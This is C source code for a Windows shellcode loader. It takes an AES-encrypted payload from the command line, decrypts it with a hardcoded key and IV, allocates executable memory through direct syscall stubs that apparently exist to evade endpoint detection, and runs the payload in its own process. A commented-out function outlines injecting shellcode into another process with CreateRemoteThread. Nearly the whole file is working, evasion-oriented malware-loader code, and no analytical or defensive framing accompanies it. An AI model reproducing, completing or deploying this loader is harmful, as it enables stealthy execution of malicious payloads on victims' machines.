#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <openssl/bio.h>
#include <openssl/evp.h>
#include <openssl/applink.c>
#include "syscalls.h"

#define AES_KEY_BITS 256
#define AES_IV_SIZE 16



void hex_to_string(const unsigned char *hex_array, size_t len, unsigned char *decoded_string) {
    if (len % 2 != 0) {
        return;
    }

    for (size_t i = 0; i < len / 2; i++) {
        sscanf((const char *)&hex_array[i * 2], "%2hhx", &decoded_string[i]);
    }
}


void decrypt_aes(const unsigned char *aes_key_hex, const unsigned char *aes_iv_hex, 
                  const unsigned char *input_hex, unsigned char **result, size_t *result_len) {
    unsigned char aes_key[AES_KEY_BITS / 8];
    unsigned char aes_iv[AES_IV_SIZE];
    
    hex_to_string(aes_key_hex, strlen((const char *)aes_key_hex), aes_key);
    hex_to_string(aes_iv_hex, strlen((const char *)aes_iv_hex), aes_iv);
    size_t input_len = strlen((const char *)input_hex) / 2;

    unsigned char *input = malloc(input_len);
    if (!input) {
        exit(EXIT_FAILURE);
    }
    hex_to_string(input_hex, strlen((const char *)input_hex), input);

    unsigned char buffer[1024];
    unsigned char plaintext[1024 + EVP_MAX_BLOCK_LENGTH];
    EVP_CIPHER_CTX *ctx;
    int len, plaintext_len;
    size_t total_plaintext_len = 0;
    size_t buffer_size = 1024 + EVP_MAX_BLOCK_LENGTH;
    unsigned char *full_plaintext = malloc(buffer_size);

    if (!full_plaintext) {
        free(input);
        exit(EXIT_FAILURE);
    }

    ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        free(input);
        free(full_plaintext);
        exit(EXIT_FAILURE);
    }

    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aes_key, aes_iv) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        free(input);
        free(full_plaintext);
        return;
    }

    const unsigned char *ptr = input;
    size_t remaining_len = input_len;

    while (remaining_len > 0) {
        size_t chunk_size = (remaining_len > sizeof(buffer)) ? sizeof(buffer) : remaining_len;
        memcpy(buffer, ptr, chunk_size);

        if (EVP_DecryptUpdate(ctx, plaintext, &plaintext_len, buffer, chunk_size) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            free(input);
            free(full_plaintext);
            return;
        }

        if (total_plaintext_len + plaintext_len > buffer_size) {
            buffer_size *= 2;
            full_plaintext = realloc(full_plaintext, buffer_size);
            if (!full_plaintext) {
                free(input);
                EVP_CIPHER_CTX_free(ctx);
                exit(EXIT_FAILURE);
            }
        }
        memcpy(full_plaintext + total_plaintext_len, plaintext, plaintext_len);
        total_plaintext_len += plaintext_len;

        ptr += chunk_size;
        remaining_len -= chunk_size;
    }

    if (EVP_DecryptFinal_ex(ctx, plaintext, &plaintext_len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        free(input);
        free(full_plaintext);
        return;
    }

    memcpy(full_plaintext + total_plaintext_len, plaintext, plaintext_len);
    total_plaintext_len += plaintext_len;

    EVP_CIPHER_CTX_free(ctx);
    free(input);

    *result = full_plaintext;
    *result_len = total_plaintext_len;
}

void run_shellcode_local(unsigned char *shellcode, size_t shellcode_len) {
    PVOID baseAddress = NULL;
    SIZE_T regionSize = shellcode_len;
    HANDLE processHandle = GetCurrentProcess();
    ULONG allocationType = MEM_COMMIT | MEM_RESERVE;
    ULONG protect = PAGE_EXECUTE_READWRITE;
    NTSTATUS status;
    status = Sw3NtAllocateVirtualMemory(processHandle, &baseAddress, 0, &regionSize, allocationType, protect);
    if (status != 0) {
        return;
    }

    memcpy(baseAddress, shellcode, shellcode_len);

    ((void(*)())baseAddress)();

    ULONG freeType = MEM_RELEASE;
    Sw3NtFreeVirtualMemory(processHandle, &baseAddress, &regionSize, freeType);
}



// void run_shellcode_remote(const char *process_name) {
//     DWORD pid = ...;
//     HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
//     if (processHandle == NULL) {
//         printf("Failed to open target process.\n");
//         return;
//     }

//     // Allocate memory in the remote process
//     PVOID baseAddress = VirtualAllocEx(processHandle, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
//     if (baseAddress == NULL) {
//         printf("Remote memory allocation failed.\n");
//         CloseHandle(processHandle);
//         return;
//     }

//     // Write the shellcode into the remote process's memory
//     SIZE_T written;
//     if (!WriteProcessMemory(processHandle, baseAddress, shellcode, sizeof(shellcode), &written)) {
//         printf("Failed to write shellcode to remote process.\n");
//         VirtualFreeEx(processHandle, baseAddress, 0, MEM_RELEASE);
//         CloseHandle(processHandle);
//         return;
//     }

//     // Create a remote thread in the target process
//     HANDLE hThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)baseAddress, NULL, 0, NULL);
//     if (hThread == NULL) {
//         printf("Failed to create remote thread.\n");
//         VirtualFreeEx(processHandle, baseAddress, 0, MEM_RELEASE);
//         CloseHandle(processHandle);
//         return;
//     }

//     // Wait for the thread to finish and clean up
//     WaitForSingleObject(hThread, INFINITE);
//     CloseHandle(hThread);
//     VirtualFreeEx(processHandle, baseAddress, 0, MEM_RELEASE);
//     CloseHandle(processHandle);
// }

unsigned char *convert_shellcode(const char *shellcode, size_t *binary_length) {
    *binary_length = 0;
    for (const char *ptr = shellcode; *ptr; ptr++) {
        if (*ptr == '\\' && *(ptr + 1) == 'x') {
            (*binary_length)++;
            ptr += 3;
        }
    }

    unsigned char *binary_shellcode = malloc(*binary_length);
    if (!binary_shellcode) {
        return NULL;
    }

    size_t index = 0;
    for (const char *ptr = shellcode; *ptr; ptr++) {
        if (*ptr == '\\' && *(ptr + 1) == 'x') {
            unsigned int byte;
            sscanf(ptr + 2, "%2x", &byte);
            binary_shellcode[index++] = (unsigned char)byte;
            ptr += 3;
        }
    }

    return binary_shellcode;
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        return 1;
    }
    
    unsigned char aes_key_hex[] = "dc0e68af5e37726d7cf51a88c19028c202f249e9857978a5a0702ced91227327";
    unsigned char aes_iv_hex[] = "d48e8f872066162eabde33152dc604c6";
    unsigned char *decrypted_shellcode;
    size_t decrypted_shellcode_len = 0;

    const char *shellcode = argv[1];

    decrypt_aes(aes_key_hex, aes_iv_hex, shellcode, &decrypted_shellcode, &decrypted_shellcode_len);

    size_t shellcode_binary_length = 0;
    unsigned char *shellcode_binary = convert_shellcode((const char *)decrypted_shellcode, &shellcode_binary_length);
    if (!shellcode_binary) {
        return 1;
    }

    const char *mode = argv[2];
    const char *process = argc > 3 ? argv[3] : NULL;

    if (strcmp(mode, "L$ L") == 0) {
        run_shellcode_local(shellcode_binary, shellcode_binary_length);
    } else if (strcmp(mode, "L$ H") == 0 && process != NULL) {
        printf("Not implemented yet.\n");
    }

    free(shellcode_binary);
    free(decrypted_shellcode);
    return 0;
}
